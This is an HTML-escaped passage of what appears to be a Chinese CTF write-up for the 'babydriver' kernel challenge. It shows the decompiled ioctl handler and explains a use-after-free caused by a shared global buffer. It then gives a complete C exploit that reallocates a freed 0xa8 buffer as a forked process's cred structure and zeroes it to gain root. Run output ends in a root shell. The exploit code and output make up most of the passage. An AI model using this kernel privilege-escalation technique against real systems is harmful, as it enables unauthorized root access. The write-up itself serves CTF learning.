&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;babyioctl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyioctl&#34;&gt;#&lt;/a&gt; babyioctl&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;babyioctl&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(file *filp, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; command, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 arg)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v5; &lt;span class=&#34;comment&#34;&gt;// rdx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 result; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _fentry__(filp, *(_QWORD *)&amp;amp;command);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( command == &lt;span class=&#34;number&#34;&gt;65537&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kfree(babydev_struct.device_buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    babydev_struct.device_buf = (&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)_kmalloc(v4, &lt;span class=&#34;number&#34;&gt;37748928LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    babydev_struct.device_buf_len = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printk(&lt;span class=&#34;string&#34;&gt;&amp;quot;alloc done\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;37748928LL&lt;/span&gt;, v5);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printk(&amp;amp;unk_2EB, v3, v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = &lt;span class=&#34;number&#34;&gt;-22LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;babyioct，会释放原本的 buf，然后重新申请一个，但是不会对空间的数据进行初始化，导致数据的泄露。v4 是一个固定的大下，在 init 中初始化为我蛮传入的第三个参数。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
&lt;p&gt;ioctl 存在一个条件竞争，使用同一个全局变量 buf，类似用户态下的 uaf。新的进程会覆盖这个变量，那么我们可以将它释放，然后重新申请出来作为新的东西，但是我们仍旧可对其进行编辑。新的进程会创建 cred, 所以就可以让他将这个空间申请出来，然后我们对其进行编辑。&lt;/p&gt;
&lt;h2 id=&#34;完整的exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完整的exp&#34;&gt;#&lt;/a&gt; 完整的 exp&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;linux/userfaultfd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;signal.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;poll.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/syscall.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/ioctl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/sem.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;semaphore.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;poll.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd1 = open(&lt;span class=&#34;string&#34;&gt;&amp;quot;dev/babydev&amp;quot;&lt;/span&gt;,O_RDWR);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd2 = open(&lt;span class=&#34;string&#34;&gt;&amp;quot;dev/babydev&amp;quot;&lt;/span&gt;,O_RDWR);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//alloc a 0xa8 space to create a fake cred&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ppid %d, pid %d\n&amp;quot;&lt;/span&gt;,getppid(),getpid());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ioctl(fd1,&lt;span class=&#34;number&#34;&gt;65537&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xa8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	close(fd1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fpid = fork();      		&lt;span class=&#34;comment&#34;&gt;//create a new proc as the same as now&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;fpid is %d\n&amp;quot;&lt;/span&gt;,fpid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ppid %d, pid %d\n&amp;quot;&lt;/span&gt;,getppid(),getpid());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!fpid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ppid %d, pid %d\n&amp;quot;&lt;/span&gt;,getppid(),getpid());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;right&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		write(fd2,buf,&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(getuid()==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;welcome!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fpid&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	wait(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	close(fd2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;fork 会返回两个 id, 这也是 fork 的一个有意的东西，这里其实是一个类似递归的调用，当我们 fork 一个新的进程后，其申请出来的资源与我们的原本进程是几乎一样的，只有部分数据不一样。有一些师傅说，父进程与子进程的实行顺序是不一样的。但是我们预测大部分情况下使直接进入子进程，进入子进程后还会调用 fork，但是此时 fork 返回的是 0，也就是说不会再嵌套下去。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[    3.998984] device open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[    3.999759] device open&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ppid 88, pid 90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[    4.000779] alloc &lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[    4.001334] device release&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fpid is 91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ppid 88, pid 90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hello&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fpid is 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ppid 90, pid 91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ppid 90, pid 91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;right&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;welcome!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/ &lt;span class=&#34;comment&#34;&gt;# id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uid=0(root) gid=0(root) &lt;span class=&#34;built_in&#34;&gt;groups&lt;/span&gt;=1000(ctf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/ &lt;span class=&#34;comment&#34;&gt;# [  101.861273] device release&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/ $ [  104.213209] ACPI: Preparing to enter system &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; state S5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一些师傅说，父进程与子进程的执行顺序会受到不同系统决策的影响。&lt;/p&gt;
&lt;p&gt;以我的设备为例。我们启动 exp 的进程，pid 为 90，他的父进程的 id 为 88，fork 出来的进程，返回的 id 为 91. 下面进入 fork 了吗？我们看到 pid，和 ppid 没有变，说明我们并没有进入到子进程，当我们的这部分结束后，有直接进入了 fork 里，子进程里又会调用 fork, 但是此时返回的是 0。&lt;/p&gt;
&lt;h2 id=&#34;打包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#打包&#34;&gt;#&lt;/a&gt; 打包&lt;/h2&gt;
